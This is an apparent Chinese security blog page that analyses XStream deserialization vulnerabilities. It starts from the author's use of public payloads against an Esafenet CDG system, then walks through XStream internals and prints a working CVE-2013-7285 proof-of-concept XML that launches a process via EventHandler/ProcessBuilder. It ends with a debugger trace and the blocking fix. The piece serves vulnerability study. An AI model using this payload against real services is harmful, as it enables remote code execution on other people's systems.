@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一次渗透引出的Java反序列化之XStream反序列化 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">一次渗透引出的Java反序列化之XStream反序列化</h1>
+    <div class="post-meta">
+      <time datetime="2025-08-06">2025-08-06</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19025027">https://www.cnblogs.com/Zephyr07/articles/19025027</a></p>
+</blockquote>
+<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>事情起源于一次挖eud某证书站的时候，遇到一个亿赛通电子文档管理系统，知道该系统之前爆过反序列化rce的洞，于是去网上搜一些反序列化的payload，最后竟然也是成功打下了，而那些反序列化就是xstream反序列化，因为之前没有系统学习过，所以现在他来了</p>
+<p>stop！先讲一下那个亿赛通的反序列化，就当提前了解了</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>因为我没有亿赛通的源码，所以主要还是参考网上的复现文章简单的来分析一下</p>
+<p><a target="_blank" rel="noopener" href="https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html">https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html</a></p>
+<p>漏洞出现点是在<code>WEB-INF/lib/jhiberest.jar</code>文件，在反编译后是发现了xstream的关键字，且依赖也是低版本1.4.9</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class SystemService extends HttpServlet &#123;</span><br><span class="line">    private static final Log log = LogFactory.getLog(FilesService.class);</span><br><span class="line">    private static String retrunString = &quot;&quot;;</span><br><span class="line">    private static final long serialVersionUID = -3607772408578536033L;</span><br><span class="line">    private XStream xStream = ServiceUtil.getStream();</span><br><span class="line">    private UserDao userDao = new UserDao();</span><br><span class="line">    private UsbKeyDao usbKeyDao = new UsbKeyDao();</span><br><span class="line">    private SecretDocDao secretDocDao = new SecretDocDao();</span><br><span class="line">    private SecretUserDao secretUserDao = new SecretUserDao();</span><br><span class="line"></span><br><span class="line">    public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String command = request.getParameter(&quot;command&quot;).toString();</span><br><span class="line">            if (command != null &amp;&amp; command.length() &gt; 0) &#123;</span><br><span class="line">                switch (CommandConstants.getCommandValue(command)) &#123;</span><br><span class="line">                    case CommandConstants.GETSYSTEMINFO /* 1601 */:</span><br><span class="line">                        getSystemInfo(request, response);</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void getSystemInfo(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        SystemReturn systemReturn = new SystemReturn();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            String xmlStr = ServiceUtil.getXMLFromRequest(request);</span><br><span class="line">            SystemServiceRequest systemServiceRequest = (SystemServiceRequest)this.xStream.fromXML(xmlStr);</span><br><span class="line">            systemReturn.setReturnMessage(&quot;OK&quot;);</span><br><span class="line">            systemReturn.setSecretKey(DocInfoModel.getCDGKey());</span><br><span class="line"></span><br><span class="line">            // ...</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">            retrunString = &quot;&quot;;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">            log.error(&quot;取系统信息&quot; + e2.getMessage());</span><br><span class="line">            systemReturn.setReturnMessage(ErrorConstants.SYSTEMSERVICE_ERROR);</span><br><span class="line">            ServiceUtil.sendInfo(request, response, this.xStream.toXML(systemReturn));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要想要走到触发xstream反序列化的地方即GETSYSTEMINFO才会顺利进入到<code>getSystemInfo</code>方法</p>
+<p>且中间request请求还会经过ServiceUtil.getXMLFromRequest方法处理，但主要就是一些编码，可以逆向解码来编码或者后续直接调用该方法也可以</p>
+<p>最后走到xStream.fromXML(xmlStr)触发反序列化</p>
+<p>后续就是构造恶意的payload编码后传给xStream.fromXML就成功了</p>
+<p>所以我们可以发现，在这个过程中触发xstream反序列化的关键函数就是fromXML函数！</p>
+<h1 id="XStream基础："><a href="#XStream基础：" class="headerlink" title="XStream基础："></a>XStream基础：</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>XStream 是一个简单的基于 Java 库，Java 对象序列化到 XML，反之亦然(即：可以轻易的将 Java 对象和 XML 文档相互转换)</p>
+<p>xstream和fastjson有一样的地方就是不同于java原生的反序列化方法，而是采用特定的方式对java对象进行转换即序列化和反序列化</p>
+<h2 id="demo演示："><a href="#demo演示：" class="headerlink" title="demo演示："></a>demo演示：</h2><p>创建一个maven项目，然后导入依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.4.10&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先定义一个接口类IPerson.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface IPerson &#123;  </span><br><span class="line">    void output();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后定义一个Person类实现前面的接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Person implements IPerson &#123;  </span><br><span class="line">    String name;  </span><br><span class="line">    int age;  </span><br><span class="line">  </span><br><span class="line">    public void output() &#123;  </span><br><span class="line">        System.out.print(&quot;Hello, this is &quot; + this.name + &quot;, age &quot; + this.age);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Xstream序列化是通过<code>XStream.toXML()</code> 来实现的(就像tojson一样)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Serialize &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        Person p = new Person();  </span><br><span class="line">        p.age = 6;  </span><br><span class="line">        p.name = &quot;pmv57&quot;;  </span><br><span class="line">        XStream xstream = new XStream(new DomDriver());  </span><br><span class="line">        String xml = xstream.toXML(p);  </span><br><span class="line">        System.out.println(xml);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807145918971-1925360067.png" alt="image"></p>
+<p>然后写个发序列化看看，XStream 反序列化是用过调用 <code>XStream.fromXML()</code> 来实现的，其中获取 XML 文件内容的方式可以通过 <code>Scanner()</code> 或 <code>FileInputStream</code> 都可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package org.example.demo;</span><br><span class="line"></span><br><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Deserialize &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">//       String xml = new Scanner(new File(&quot;person.xml&quot;)).useDelimiter(&quot;\\Z&quot;).next();</span><br><span class="line">        FileInputStream xml = new FileInputStream(&quot;D:\\Security\\JavaStudy\\java_src\\serialize\\Xstream\\demo\\src\\main\\java\\org\\example\\demo\\person.xml&quot;);</span><br><span class="line">        XStream xstream = new XStream(new DomDriver());</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807145935638-395939331.png" alt="image"></p>
+<p>然后这就是简单看一下xstream是如何反序列化的</p>
+<h2 id="XStream-类图"><a href="#XStream-类图" class="headerlink" title="XStream 类图"></a>XStream 类图</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150015066-534802760.png" alt="image"></p>
+<p>注：引用drun1baby师傅的图片</p>
+<p>这几个部分我就不都一一分析了，主要还是分析一下最重要的DynamicProxyConverter 动态代理转换器，这是存在xstream反序列化的漏洞最主要的原因</p>
+<h3 id="DynamicProxyConverter-动态代理转换器"><a href="#DynamicProxyConverter-动态代理转换器" class="headerlink" title="DynamicProxyConverter 动态代理转换器"></a>DynamicProxyConverter 动态代理转换器</h3><p>DynamicProxyConverter是xstream支持的一种动态代理转换器</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150058378-1312961945.png" alt="image"></p>
+<p>他可以将xml中的dynamic-proxy标签中的内容转换成对应的动态代理对象，而当动态代理对象调用了dynamic-proxy标签内的interface标签指向的接口中声明的方法，根据之前学习的动态代理机制，就知道他会触发对应的handler也就是dynamic-proxy标签下handler节点的EventHandler中的invoke方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dynamic-proxy&gt;  </span><br><span class="line">  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;  </span><br><span class="line">  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;  </span><br><span class="line">  &lt;handler class=&quot;com.foo.MyHandler&quot;&gt;  </span><br><span class="line">    &lt;something&gt;blah&lt;/something&gt;  </span><br><span class="line">  &lt;/handler&gt;  </span><br><span class="line">&lt;/dynamic-proxy&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE_2013_7285"></a>CVE_2013_7285</h1><p>拿一个Xstream最初的漏洞来学习一下</p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;dynamic-proxy&gt;  </span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;  </span><br><span class="line">    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;  </span><br><span class="line">      &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;  </span><br><span class="line">        &lt;command&gt;  </span><br><span class="line">          &lt;string&gt;Calc&lt;/string&gt;  </span><br><span class="line">        &lt;/command&gt;  </span><br><span class="line">      &lt;/target&gt;  </span><br><span class="line">      &lt;action&gt;start&lt;/action&gt;  </span><br><span class="line">    &lt;/handler&gt;  </span><br><span class="line">  &lt;/dynamic-proxy&gt;  </span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>
+
+<p>触发代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package org.example.demo;</span><br><span class="line"></span><br><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class cve_2013_7285 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(&quot;D:\\Security\\JavaStudy\\java_src\\serialize\\Xstream\\demo\\src\\main\\java\\org\\example\\demo\\person.xml&quot;);</span><br><span class="line">        XStream xStream = new XStream(new DomDriver());</span><br><span class="line">        xStream.fromXML(fileInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后运行之后成功弹出计算器</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150126118-296301861.png" alt="image"></p>
+<h2 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h2><p>断点首先下到TreeUnmarshaller中的start方法，会调用<code>HierarchicalStreams.readClassType()</code> 来获取到 PoC XML 中根标签的类类型</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150150091-242272595.png" alt="image"></p>
+<p>然后跟到readClassType方法中，发现会<code>mapper.realClass()</code> 进行循环遍历(用来查找xml中的根标签为什么类型)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150217792-427185867.png" alt="image"></p>
+<p>然后跟出来到下一步convertAnother函数对<code>java.util.SortedSet</code> 类型进行转换</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150227927-1295114302.png" alt="image"></p>
+<p>跟进去看一下，发现调用了<code>mapper.defaultImplementationOf()</code> 函数来寻找 <code>java.util.SortedSet</code> 类型的默认实现类型进行替换，这里转换为了 <code>java.util.TreeSet</code> 类型</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150239313-1743268746.png" alt="image"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150250432-1818965397.png" alt="image"></p>
+<p>然后就是寻找Convert，这里找到的对应的转换器是<code>TreeMapConverter</code></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150319169-58436425.png" alt="image"></p>
+<p>然后会执行到AbstractReferenceUnmarshaller.convert()中，并且会调用<code>getCurrentReferenceKey()</code> 来获取当前的 Reference 键，并且会将当前的 Reference 键压到栈中(这个键在后续会和保存的<code>java.util.TreeSet</code> 类一一对应)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150328286-219653027.png" alt="image"></p>
+<p>紧接着调用父类的<code>FastStack.convert()</code> 方法，发现将类型压入栈，然后调用TreeSetConverter 的unmarshal方法(存疑，代码有问题)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150336625-677958682.png" alt="image"></p>
+<p>跟进去看看，它会调用unmarshalComparator方法，这个方法通过判断<code>reader</code> 是否还有子元素来获取xml根元素的子元素</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150351848-1729254352.png" alt="image"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150400902-1218126575.png" alt="image"></p>
+<p>而reader.moveDown()会把子元素获取并添加到当前 context 的 pathTracker</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150409615-357571101.png" alt="image"></p>
+<p>回到TreeSetConverter.unmarshal()方法中，看一下this.treeMapConverter.populateTreeMap()这个函数</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150417563-1787153698.png" alt="image"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150425298-2059850668.png" alt="image"></p>
+<p>在这个方法里，xstream就开始处理了xml里面其他的节点元素，首先判断是不是第一个元素，是的话就调用<code>putCurrentEntryIntoMap()</code>函数，就是将当前的内容缓存到map中</p>
+<p>跟进去看一下，发现调用 <code>readItem()</code> 方法读取标签内的内容并缓存到当前 Map 中</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150435915-1331203488.png" alt="image"></p>
+<p>在跟进readitem方法，会发现他又调用了<code>HierarchicalStreams.readClassType()</code> 和 <code>context.convertAnother()</code> 方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150444258-1600698725.png" alt="image"></p>
+<p>跟进去看一下，这里我们可以看mapper发现他其中还是两个元素，而xstream就会处理最里层的那个</p>
+<p>而他同时会返回一个type，就是最新最里层的那个子元素类型，我们跟代码看赋值发现是<code>com.thoughtworks.xstream.mapper.DynamicProxyMapper#DynamicProxy</code>，对应的转换器为 <code>DynamicProxyConverter</code></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150453065-1086178693.png" alt="image"></p>
+<p>我们所编写的xml获取到的子元素为<interface>，然后跟进<code>DynamicProxyConverter</code>的unmarshal里面会判断<code>if (elementName.equals(&quot;interface&quot;))</code>，如果为 true，则将目前 <code>&lt;interface&gt;</code> 节点的元素获取到，再获得转换类型</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150501408-1122735752.png" alt="image"></p>
+<p>在我们写的xml中在interface下还存在子元素，获取完完 <code>&lt;interface&gt;</code> 后重新进入这个迭代，下一个获取到的子元素是 <code>&lt;handler&gt;</code></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150510161-1667032864.png" alt="image"></p>
+<p>然后继续向下，在<code>DynamicProxyConverter</code>中125行（看个人，但都是在附近）调用了<code>Proxy.newProxyInstance()</code> 方法，是用来实例化代理类的过程</p>
+<p>然后在127行（同理看个人）调用<code>context.convertAnother()</code> 方法，跟进一下</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150518403-195987473.png" alt="image"></p>
+<p>对应的转换器是AbstractReflectionConverter，跟进，发现会先调用<code>instantiateNewInstance()</code> 方法实例化一个 <code>EventHandler</code> 类</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150524958-2089366274.png" alt="image"></p>
+<p>继续在AbstractReflectionConverter中，到429行左右（同理，看个人情况），看代码赋值type为<code>class java.lang.ProcessBuilder</code></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150533138-1467895257.png" alt="image"></p>
+<p>后续就是继续的xstream处理xml，都是类似的运行流程</p>
+<p>然后最后的最后又会到<code>treeMapConverter.populateTreeMap()</code> 这个地方</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150540257-1029710802.png" alt="image"></p>
+<p>然后一直步过，直到122行调用了put.all方法，变量是sortedMap，我们可以看一下赋值发现就是一段链式存储的数据</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807150547398-344269339.png" alt="image"></p>
+<p>最后最后调用到<code>EventHandler#invoke</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">invoke:428, EventHandler (java.beans)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:1294, TreeMap (java.util)</span><br><span class="line">put:538, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><p>官方增加了黑名单：</p>
+<p>用户可以为动态代理注册自己的转换器，即 java.beans.EventHandler 类型或 java.lang.ProcessBuilder 类型，这也可以防止这种特殊情况的攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(new Converter() &#123;</span><br><span class="line">  public boolean canConvert(Class type) &#123;</span><br><span class="line">    return type != null &amp;&amp; (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_LOW);</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">https://drun1baby.top/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html">https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html</a></p>
+</blockquote>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/08/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%A3%E5%AE%A1%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87/" class="prev">← 记录一次代审过程中的鉴权绕过</a>
+    
+    
+      <a href="/2025/07/31/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%88%B0RCE%E5%88%86%E6%9E%90/" class="next">SpringBoot任意文件写入到RCE分析 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
